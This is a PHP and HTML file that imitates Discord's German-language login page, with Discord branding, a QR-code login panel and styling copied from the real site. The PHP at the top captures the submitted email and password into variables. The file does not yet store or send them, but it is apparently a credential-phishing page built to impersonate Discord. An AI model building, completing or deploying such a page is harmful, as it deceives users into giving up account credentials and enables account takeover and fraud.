<?php
if (isset($_GET['send'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];    
}

?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link rel="icon" href="discord-icon.png">
    
    <title>Discord</title>
</head>

<body>
<form action="?send" method="post">
    <div class="login-box">
    <h4 id="back"><img id="image-back"src="arrow-left.png" width="16" height="16">Zurück</h4>
    <h1 id="welcome">Willkomen zurück!</h1>
    <h1 id="welcome-back">Wir freuen uns so, dich wiederzusehen!</h1>
    <div class="qr-code">
        <img id="loading-gif" src="loading.gif" width="64" height="64"><br>
        <h2 id="loading-gif-text">Mit QR-Code <br>einloggen</h2>
        <h5 id="loading-gif-text-info">Scanne den Code mit der <b>Discord-<br>App </b> und logge dich sofort ein.</h5>
    </div>
    <h1 id="email-label">E-MAIL ODER TELEFONNUMMER *</h1>
    <input id="email" name="email" type="email">
    <h1 id="password-label">PASSWORT *</h1>
    <input name="password" id="password" type="password"><br>
    <a href="www.discord/#">Password vergessen?</a><br><br>
    <input type="submit" id="sign-in">
    <h1 id="register">Brauchst du einen Account?<a>Registeren</a></h1>
    </div>
</form>
</body>
</html>
<style>
    body{
        background-image: url('discord-background.png');
        background-size: contain;
        background-repeat: no-repeat;
        background-size: 100%;
        font-family: 'Roboto', sans-serif;
        color: aliceblue;
    }
    #back{
        color: #DCDDDE;
        font-weight: 400;
    }
    #image-back{
        float: left;
        margin-left: 3vh;
    }
    .login-box{
        background-color: #34373e;
        padding: 0.3vh;
        border-radius: 7px;
        margin-top: 25vh;
        margin-left: 64vh;
        margin-right: 64vh;
    }
    #welcome{
        margin-left: 14vh;
        font-size: 24px;
    }
    #welcome-back{
        font-size: 16px;
        color: #B9BBBE;
        margin-left: 10vh;
        font-weight: 400;
    }
    #email-label{
        font-size: 12px;
        color: #B9BBBE;
        margin-left: 2.5vh; 
        margin-top: 2.5vh;
    }
    #email{
        margin-left: 2.5vh;
        height: 3.5vh;
        width: 39vh;
        border-radius: 4px;
        border: none;
    }
    #password-label{
        font-size: 12px;
        color: #B9BBBE;
        margin-left: 2.5vh;
        margin-top: 2.5vh;  
    }
    #password{
        margin-left: 2.5vh;
        height: 3.5vh;
        width: 39vh;
        border-radius: 4px;
        border: none;
    }
    a {
        color: #00AFF4;
        text-decoration: none;
        font-size: 12px;
        margin-left: 2.5vh;
    }
    a:hover{
        text-decoration: underline;
    }
    #sign-in{
        background-color: #5865F2;
        border: none;
        border-radius: 5px;
        margin-left: 2.5vh;
        height: 5vh;
        width: 39vh;
        color: #FFFFFF;
    }
    #register{
        font-size: 12px;
        font-weight: 400;
        margin-left: 2.5vh;
        color: #B9AAAA;
        margin-bottom: 4vh;
    }
    #register a{
        margin-left: 4px !important;
    }
    .qr-code{
        float: right;
    }
    .qr-code h2{
        padding-right: 10vh !important;
        text-align: center;
        margin-top: 7vh;
    }
    .qr-code h5{
        padding-right: 9vh !important;
        font-weight: 400;
        color: #B9BBBE;
        font-size: 16px;
    }
    .qr-code img {
        position: absolute;
        top: 35%;
        left: 57.5%;
    }
</style>